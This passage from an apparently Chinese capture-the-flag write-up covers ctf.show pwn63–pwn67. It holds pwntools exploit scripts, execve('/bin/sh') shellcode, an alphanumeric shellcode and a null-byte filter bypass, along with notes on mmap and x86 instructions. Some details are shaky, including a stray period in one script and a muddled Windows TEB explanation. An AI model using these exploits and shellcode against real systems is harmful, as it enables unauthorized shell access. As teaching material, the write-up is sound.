class="line">offset = 0x10 + 0x8</span><br><span class="line">shellcode = b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x5</span><br><span class="line"> 2\x57\x54\x5e\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">#由于buf被使用之后会被回收，此处将shellcode写在返回地址的下一个地址，也就是v5+0x10+0x8+0x8的位置</span><br><span class="line">payload = cyclic(offset) + p64(buf + 0x20) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>shellcode搜索网站：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes?platform=linux_x86">Exploit Database Shellcodes (exploit-db.com)</a></p>
<h4 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h4><p>题目tips：更短一点</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801141329246.png" alt="image-20240801141329246"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801141414218.png" alt="image-20240801141414218"></p>
<p>这次只有0x37的空间了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn63&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28155&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;[&#x27;)</span><br><span class="line">#从进程 p 中接收数据，直到遇到字符 ]，并且丢弃这个结束字符 ]，这里读取到了v5的地址</span><br><span class="line">buf = p.recvuntil(&#x27;]&#x27;,drop=True)</span><br><span class="line">buf = int(buf,16)</span><br><span class="line">#计算偏移值，生成shellcode</span><br><span class="line">offset = 0x10 + 0x8</span><br><span class="line">shellcode = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">#由于buf被使用之后会被回收，此处将shellcode写在返回地址的下一个地址，也就是v5+0x10+0x8+0x8的位置</span><br><span class="line">payload = cyclic(offset) + p64(buf + 0x20) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>shellcode链接：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/46907">Linux&#x2F;x64 - execve(&#x2F;bin&#x2F;sh) Shellcode (23 bytes) (exploit-db.com)</a></p>
<h4 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h4><p>题目提示：有时候开启某种保护并不意味着这条路不通</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801142010122.png" alt="image-20240801142010122"></p>
<p>32bit，开启了nx保护，就像题目说的那样</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801144058771.png" alt="image-20240801144058771"></p>
<p>在源程序中使用mmap映射了一块大小为0x400，权限为7的空间，直接写入shellcode即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 记得把amd64改成i386</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn64&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28308&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).</span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="mmap补充"><a href="#mmap补充" class="headerlink" title="mmap补充"></a>mmap补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mmap(start,length,port,flags,fd,offset)</span><br><span class="line">[头文件]:</span><br><span class="line">&lt;sys/mman.h&gt;</span><br><span class="line">[函数原型]:</span><br><span class="line"></span><br><span class="line">void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</span><br><span class="line">int munmap(void* start,size_t length);</span><br><span class="line">[参数]:</span><br><span class="line">参数 start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</span><br><span class="line"></span><br><span class="line">参数 length：代表将文件中多大的部分映射到内存。</span><br><span class="line"></span><br><span class="line">参数 prot：映射区域的保护方式。可以为以下几种方式的组合：</span><br><span class="line">PROT_EXEC 映射区域可被执行</span><br><span class="line">PROT_READ 映射区域可被读取</span><br><span class="line">PROT_WRITE 映射区域可被写入</span><br><span class="line">PROT_NONE 映射区域不能存取</span><br><span class="line"></span><br><span class="line">参数 flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</span><br><span class="line">MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。</span><br><span class="line">MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</span><br><span class="line">MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</span><br><span class="line">MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</span><br><span class="line">MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</span><br><span class="line">MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</span><br><span class="line"></span><br><span class="line">参数 fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</span><br><span class="line"></span><br><span class="line">参数 offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</span><br><span class="line"></span><br><span class="line">[返回值]：</span><br><span class="line"></span><br><span class="line">若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(-1)，错误原因存于errno中。</span><br></pre></td></tr></table></figure>

<h4 id="pwn65"><a href="#pwn65" class="headerlink" title="pwn65"></a>pwn65</h4><p>题目提示：你是一个好人（不要好人卡，这下不得不hack你了）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801145748090.png" alt="image-20240801145748090"></p>
<p>ida无法反编译程序，看看汇编代码吧</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801213456686.png" alt="image-20240801213456686"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先是一个write函数和read函数，write函数输出&quot;Input you Shellcode\n&quot;，read函数为read(0,buf,400h)，然后将eax的值赋给var8，此处的eax为read函数的返回值，也就是read读入的字符串的长度，很明显只要read有输入就会跳转到右边的程序</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801213807795.png" alt="image-20240801213807795"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801214449599.png" alt="image-20240801214449599"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">右边的程序中，先将var4赋0，再将var4与var8作比较，var4&lt;var8时跳转到左边的程序，但是我们需要将程序流跳转到右边，因为右边的程序中有一个call函数可以执行shellcode</span><br><span class="line">此时再看loc_11B8，先将var4赋值到eax，在使用cdqe进行位数拓展，movzx移动buf中和rax对应的字符到eax，将eax与60h进行比较，如果al&lt;=60h，跳转到loc_11DA，否则跳转到右边程序</span><br><span class="line">右边程序表示如果al&lt;=&#x27;z&#x27;，则跳转到右侧程序loc_1236，对var4加一，也就是说，如果buf中的字符大于&#x27;`&#x27;（大于等于&#x27;a&#x27;）且小于等于&#x27;z&#x27;，在a-z之间就给var4加一，否则跳转到loc_11DA</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240801214827783.png" alt="image-20240801214827783"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">看loc_11DA，如果al小于等于40h，跳转到loc_11FC，否则跳转到右侧程序，即al&gt;=&#x27;A&#x27;</span><br><span class="line">右侧程序，如果al&lt;=&#x27;Z&#x27;，则给var4加一，否则跳转到loc_11FC</span><br><span class="line">loc_11FC，如果al&lt;=&#x27;/&#x27;，则跳转到loc_121E，否则跳转到右侧程序(al&gt;=&#x27;1&#x27;)</span><br><span class="line">右侧程序，如果al&lt;=&#x27;Z&#x27;，则给var4加一</span><br><span class="line">loc_121E是一个printf函数，然后结束程序，由于不重要这里就不作赘述了</span><br></pre></td></tr></table></figure>

<p>总结以下，如果al在(2f,5a]或者(60,7a]的范围内，则一直给var4加一，直到var4大于var8，然后执行shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">人工反编译</span><br><span class="line">for(对shellcode的每个字符进行比较)</span><br><span class="line">&#123;</span><br><span class="line">如果字符的ascii在30-5a，61到7a的范围内，就一直循环，否则异常跳出循环，结束程序</span><br><span class="line">如果所有字符都满足条件，最后执行shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是使用alpha3工具将普通shellcode转为只有大写字母和数字的shellcode(不知道为什么总是不成功，很烦，所以还是用了官方wp的shellcode)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">print(shellcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn65&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28165&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line">p.recvuntil(&quot;Shellcode&quot;)</span><br><span class="line">#这里注意用send而不是sendline，因为sendline会自带多一个\n，shellcode就会无法执行</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="cdqe指令"><a href="#cdqe指令" class="headerlink" title="cdqe指令"></a>cdqe指令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CDQE 是 x86-64 架构中的一条汇编指令，它的全称是 Convert Doubleword to Quadword Extended，用于将32位的双字（doubleword）扩展为64位的四字（quadword）。</span><br><span class="line"></span><br><span class="line">作用</span><br><span class="line">CDQE 指令将32位寄存器 EAX 的值符号扩展（sign-extend）到64位寄存器 RAX 中。符号扩展的意思是，如果 EAX 的最高位（也就是符号位）是0，那么扩展后的高32位也全为0；如果最高位是1，那么扩展后的高32位全为1。这是为了保持正负号一致。</span><br><span class="line"></span><br><span class="line">使用场景</span><br><span class="line">CDQE 常用于将一个32位整数转换为64位整数时保持符号一致。例如，当需要在64位计算中使用32位的有符号整数时，可以使用 CDQE 将其正确扩展到64位。</span><br></pre></td></tr></table></figure>

<h5 id="movzx指令"><a href="#movzx指令" class="headerlink" title="movzx指令"></a>movzx指令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movzx 指令</span><br><span class="line">movzx（Move with Zero-Extend）是一个将源操作数的值搬到目的操作数，并对目的操作数高位部分进行零扩展的指令。它通常用于从较小的数值类型（如字节或字）搬运到较大的寄存器中，同时将高位用零填充。</span><br></pre></td></tr></table></figure>

<h4 id="pwn66"><a href="#pwn66" class="headerlink" title="pwn66"></a>pwn66</h4><p>题目提示：简单的shellcode？不对劲，十分得有十二分的不对劲</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240804222534152.png" alt="image-20240804222534152"></p>
<p>观察反编译代码</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240804222631432.png" alt="image-20240804222631432"></p>
<p>重点在于check函数，跟进check函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240804224340320.png" alt="image-20240804224340320"></p>
<p>对于输入的shellcode(a1)，如果a1不是空的话，进入循环，对一个字符串unk_400F20进行遍历，寻找a1是否全部都在unk_400F20中，如果全部都在，就返回1，否则返回0</p>
<p>如何绕过：一个方法是使用按照题目条件写出shellcode，另一个方法是不要进入while的循环，以\x00为开头绕过while循环直接返回1</p>
<p>以下是官方wp给出的一个筛选不对会shellcode的执行过程产生影响汇编指令的python脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from itertools import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">for i in range(1, 3):</span><br><span class="line">	for j in product([p8(k) for k in range(256)], repeat=i):</span><br><span class="line">		payload = b&quot;\x00&quot; + b&quot;&quot;.join(j)</span><br><span class="line">		res = disasm(payload)</span><br><span class="line">		if (res != &quot;        ...&quot; and not re.search(r&quot;\[\w*?\]&quot;, res) and &quot;.byte&quot; not in res ):</span><br><span class="line">    		print(res)</span><br><span class="line">    		input()</span><br></pre></td></tr></table></figure>

<p>正则表达式分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">这段条件代码用于过滤特定的反汇编结果。我们逐一解释这些条件的含义：</span><br><span class="line"></span><br><span class="line">1. `res != &quot;        ...&quot;`</span><br><span class="line"></span><br><span class="line">含义：检查反汇编的结果 `res` 是否不是 `&quot;        ...&quot;`。</span><br><span class="line">背景：在某些情况下，反汇编工具可能无法识别特定的字节序列，从而返回省略号 `...` 来表示这些字节未能被成功反汇编成合法的指令。这通常意味着给定的字节序列没有对应的有效汇编指令或无法解析。</span><br><span class="line"></span><br><span class="line">2. `not re.search(r&quot;\[\w*?\]&quot;, res)`</span><br><span class="line"></span><br><span class="line">含义：使用正则表达式 `r&quot;\[\w*?\]&quot;` 搜索 `res`，检查反汇编结果中是否存在形如 `[something]` 的模式。如果存在，这个正则表达式会匹配 `[something]` 这样的字符串，`not` 操作符用于反转匹配结果。</span><br><span class="line">背景：反汇编结果中 `[something]` 的模式通常表示寄存器或内存地址访问（例如 `mov eax, [ebx]` 表示从 `ebx` 指向的内存位置读取数据到 `eax`）。此条件过滤掉含有这种模式的结果。</span><br><span class="line"></span><br><span class="line">3. `&quot;.byte&quot; not in res`</span><br><span class="line"></span><br><span class="line">含义：检查反汇编结果 `res` 中不包含 `.byte` 字符串。</span><br><span class="line">背景：`.byte` 通常用于反汇编结果表示原始字节数据而不是可执行指令。例如，反汇编器无法识别字节序列时，可能输出 `.byte 0xNN` 来表示这些字节。因此，如果 `res` 包含 `.byte`，这意味着这些字节没有被识别为有效指令，代码将过滤掉这些情况。</span><br><span class="line"></span><br><span class="line">综述</span><br><span class="line"></span><br><span class="line">这些条件一起使用，用于筛选特定类型的反汇编结果。具体来说，它们的目的是：</span><br><span class="line"></span><br><span class="line">1. 排除无法识别的或无效的字节序列（用省略号表示的）。</span><br><span class="line">2. 排除涉及寄存器或内存地址访问的指令（通过正则表达式检查）。</span><br><span class="line">3. 排除仅显示为原始字节数据而不是有效指令的输出（通过检查 `.byte` 关键字）。</span><br><span class="line"></span><br><span class="line">最终，代码只输出那些可以识别且不涉及内存访问的指令，确保这些指令符合某些预期的安全性或功能性条件。这种筛选可能用于安全研究，以找到特定类型的指令序列或避免特定的操作。</span><br></pre></td></tr></table></figure>

<p>发送payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn66&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28298&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode= b&quot;\x00\xc0&quot; + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn67"><a href="#pwn67" class="headerlink" title="pwn67"></a>pwn67</h4><p>题目提示：32-bit nop sled</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240805160509531.png" alt="image-20240805160509531"></p>
<p>可以看到开启了canary，检测栈溢出，题目提示使用nop sled解题</p>
<p>反编译代码</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240805214021377.png" alt="image-20240805214021377"></p>
<p>如何执行shellcode，实际上可以看到执行shellcode的部分是v5()这句代码，而v5是由我们输入的，再往上是使用fgets读取seed，这里是输入shellcode的部分，也就是说，要准确地输入shellcode的首地址，在不使用nop sled的情况下。然而从程序中是无法得到seed的地址的，只能获取一个随机的地址，这也是此处使用nop sled技巧的原因</p>
<h5 id="readgsdword-函数"><a href="#readgsdword-函数" class="headerlink" title="__readgsdword()函数"></a>__readgsdword()函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">`__readgsdword` 是一个特定于 Windows 操作系统的函数，用于从线程环境块 (TEB) 中读取数据。TEB 是 Windows 操作系统中的一个数据结构，为每个线程提供其自己的存储空间，用于存储线程的特定数据。</span><br><span class="line"></span><br><span class="line">具体来说，`__readgsdword` 函数用于从 TEB 的某个偏移位置读取一个 32 位的双字 (DWORD) 数据。它的使用方式通常如下：</span><br><span class="line"></span><br><span class="line">unsigned long value = __readgsdword(offset);</span><br><span class="line"></span><br><span class="line">其中 `offset` 是 TEB 中的一个偏移量，以字节为单位，指示要读取的双字数据的位置。</span><br><span class="line"></span><br><span class="line">在 Windows 系统上，`__readgsdword` 使用 `gs` 段寄存器来定位 TEB。段寄存器 `gs` 在 x86 架构中用于指向特定的内存段，Windows 操作系统利用这一特性，将 `gs` 段寄存器用于指向当前线程的 TEB。这使得线程可以快速访问其私有数据，如线程局部存储 (TLS)、异常调度器链、线程 ID 等。</span><br><span class="line"></span><br><span class="line">代码示例与解释</span><br><span class="line"></span><br><span class="line">假设我们有以下代码：</span><br><span class="line"></span><br><span class="line">unsigned long value = __readgsdword(0x14);</span><br><span class="line"></span><br><span class="line">这里，`0x14` 是偏移量，这个偏移量表示 TEB 中某个特定的双字数据。例如，`0x14` 偏移量处的数据通常用于存储当前线程的堆栈基址。</span><br><span class="line"></span><br><span class="line">常见用途：</span><br><span class="line">- 读取 TLS 索引</span><br><span class="line">- 获取线程堆栈信息</span><br><span class="line">- 获取当前线程 ID</span><br><span class="line"></span><br><span class="line">使用注意</span><br><span class="line">- 系统依赖：`__readgsdword` 是一个特定于 Windows 系统的函数，其他操作系统不支持这个函数。</span><br><span class="line">- 架构限制：该函数特定于 x86 架构，利用段寄存器 `gs` 的特性来访问 TEB。如果在 x64 架构上使用类似功能，通常会使用 `gs` 寄存器访问 `gs` 段的不同偏移。</span><br><span class="line"></span><br><span class="line">由于直接操作内存和寄存器，这种函数使用不当可能导致系统崩溃或不可预测的行为。开发者在使用它时需格外小心，并确保理解目标偏移的数据结构和含义。</span><br></pre></td></tr></table></figure>

<h5 id="TEB，gs寄存器知识补充"><a href="#TEB，gs寄存器知识补充" class="headerlink" title="TEB，gs寄存器知识补充"></a>TEB，gs寄存器知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">TEB (Thread Environment Block)</span><br><span class="line"></span><br><span class="line">TEB (Thread Environment Block)，中文译为**线程环境块**，是微软 Windows 操作系统中为每个线程分配的一个数据结构。TEB 存储了与线程相关的各种信息，例如：</span><br><span class="line"></span><br><span class="line">1. 线程局部存储 (TLS) 数据：线程专属的数据，每个线程都有自己的一份拷贝。</span><br><span class="line">2. 异常调度链表：用于异常处理和栈展开。</span><br><span class="line">3. 堆栈信息：包括堆栈基地址、堆栈顶地址等。</span><br><span class="line">4. 线程 ID：唯一标识线程的标识符。</span><br><span class="line">5. 线程启动参数：传递给线程的参数。</span><br><span class="line">6. 线程优先级：当前线程的优先级。</span><br><span class="line">7. 线程的最后错误代码：用于记录线程最近发生的错误代码。</span><br><span class="line"></span><br><span class="line">TEB 的结构定义了线程运行时所需的一些关键数据，它是多线程编程中一个重要的底层组件。每个线程都有自己独立的 TEB，操作系统在调度线程时会使用 TEB 来维护线程的状态。</span><br><span class="line"></span><br><span class="line">GS 寄存器</span><br><span class="line"></span><br><span class="line">在 x86 和 x86_64 架构的 CPU 中，**GS** 是一个段寄存器。段寄存器用于访问段机制中的特定段，这种机制是早期内存管理和保护模式的一部分。每个段寄存器都有一个对应的段选择子，用于指向一个段描述符，后者定义了段的基地址、长度和访问权限。</span><br><span class="line"></span><br><span class="line">GS 寄存器 的具体用途在不同的操作系统和平台上可能有所不同。在 Windows 上：</span><br><span class="line"></span><br><span class="line">- 在 x86 架构中，`GS` 通常指向当前线程的 TEB。这使得线程可以通过特定的偏移量快速访问与自身相关的各类数据，例如 TLS、线程堆栈等。</span><br><span class="line">- 在 x86_64 架构中，`GS` 仍然用来指向 TEB 或类似的数据结构，但因为 x86_64 中段机制的变化，使用 `FS` 和 `GS` 的方式有所不同。在 x86_64 上，GS 寄存器更多地用于指向用户定义的结构。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line"></span><br><span class="line">- TEB 是每个线程独有的环境块，包含线程相关的各种信息。</span><br><span class="line">- GS 寄存器 是 x86/x86_64 架构中的一个段寄存器，在 Windows 系统中通常用来指向 TEB。</span><br><span class="line"></span><br><span class="line">这些机制是操作系统如何有效管理和调度多线程应用程序的重要基础。通过 TEB 和段寄存器，系统可以快速获取每个线程的私有数据，提高线程切换和管理的效率。</span><br></pre></td></tr></table></figure>

<p>setbuf(stdout,0)将输出直接输出到标准输出不使用缓冲区，srand函数根据seed生成一个随机数，跟进Loading函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240805214706810.png" alt="image-20240805214706810"></p>
<p>usleep函数就是sleep函数的削弱版，以微秒为单位进行sleep操作，Loading函数实际上只是一个会停止程序运行一会的函数，对程序的结果没什么影响，跟进acquire_satellites函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240805214908054.png" alt="image-20240805214908054"></p>
<p>跟Loading函数的作用好像差不多，通过在两个Signal之间putchar(46)的次数可以推断出rand()出的随机数的末位（有什么用吗，好像没有），跟进query_position函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240805215445512.png" alt="image-20240805215445512"></p>
<p>query_position函数，先生成一个v2，v2的范围为-668到668之间的随机整数，返回一个以v1为基址，跟v2相关的变址，通过printf函数输出这个地址</p>
<p>从这个地址计算出seed所在的地址无疑是本题最大的难点和重点</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240806224700460.png" alt="image-20240806224700460"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240806231232519.png" alt="image-20240806231232519"></p>
<p>通过汇编代码中对栈的操作可以计算出栈空间的分布情况（很明显是用excel搞的）</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240806233544206.png" alt="image-20240806233544206"></p>
